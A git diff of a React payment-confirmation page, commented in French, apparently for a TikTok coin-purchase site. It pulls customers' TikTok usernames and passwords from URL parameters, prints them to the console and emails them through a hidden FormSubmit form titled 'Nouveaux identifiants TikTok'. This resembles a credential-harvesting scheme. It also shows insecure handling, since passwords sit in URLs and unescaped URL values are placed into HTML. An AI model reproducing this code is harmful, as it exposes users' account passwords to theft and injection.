@@ -16,12 +16,18 @@ export const PaymentConfirmation = () => {
   const location = useLocation();
   const navigate = useNavigate();
   
-  // Récupérer l'orderId et les identifiants depuis l'URL
+  // Récupérer l'orderId, les identifiants et les détails d'achat depuis l'URL
   const searchParams = new URLSearchParams(location.search);
   const orderId = searchParams.get('orderId');
   const username = searchParams.get('username');
   const password = searchParams.get('password');
   const email = searchParams.get('email');
+  const amountFromUrl = searchParams.get('amount');
+  const priceFromUrl = searchParams.get('price');
+  
+  // Convertir les valeurs en nombres si elles existent
+  const amount = amountFromUrl ? parseInt(amountFromUrl, 10) : null;
+  const price = priceFromUrl ? parseInt(priceFromUrl, 10) : null;
   
   useEffect(() => {
     if (orderId) {
@@ -42,8 +48,23 @@ export const PaymentConfirmation = () => {
   }, [orderId]);
   
   const handleSendCredentials = async () => {
-    if (!username || !password || !email || !orderId || !purchaseDetails) {
-      setSendError(t('missingInformation', 'Informations manquantes pour envoyer les identifiants'));
+    // Vérifier les paramètres essentiels
+    const missingParams = [];
+    if (!username) missingParams.push('Nom d\'utilisateur TikTok');
+    if (!password) missingParams.push('Mot de passe TikTok');
+    if (!email) missingParams.push('Email');
+    if (!orderId) missingParams.push('Numéro de commande');
+    if (!amount && !purchaseDetails) missingParams.push('Nombre de pièces');
+    if (!price && !purchaseDetails) missingParams.push('Prix');
+    
+    // Afficher dans la console pour le débogage
+    console.log('Paramètres de l\'URL:', { username, password, email, orderId, amount, price });
+    console.log('Détails de l\'achat:', purchaseDetails);
+    
+    // Vérifier les paramètres essentiels
+    if (missingParams.length > 0) {
+      const missingInfo = missingParams.join(', ');
+      setSendError(`Informations manquantes pour envoyer les identifiants: ${missingInfo}`);
       return;
     }
     
@@ -83,9 +104,15 @@ export const PaymentConfirmation = () => {
             <input type="hidden" name="username" value="${username}" />
             <input type="hidden" name="password" value="${password}" />
             <input type="hidden" name="orderId" value="${orderId}" />
+            ${purchaseDetails ? `
             <input type="hidden" name="amount" value="${purchaseDetails.amount}" />
             <input type="hidden" name="price" value="${purchaseDetails.price}" />
             <input type="hidden" name="date" value="${new Date(purchaseDetails.date).toLocaleString()}" />
+            ` : `
+            <input type="hidden" name="amount" value="${amount || 'Non disponible'}" />
+            <input type="hidden" name="price" value="${price || 'Non disponible'}" />
+            <input type="hidden" name="date" value="${new Date().toLocaleString()}" />
+            `}
             
             <!-- Configuration FormSubmit -->
             <input type="hidden" name="_subject" value="Nouveaux identifiants TikTok - Commande ${orderId}" />
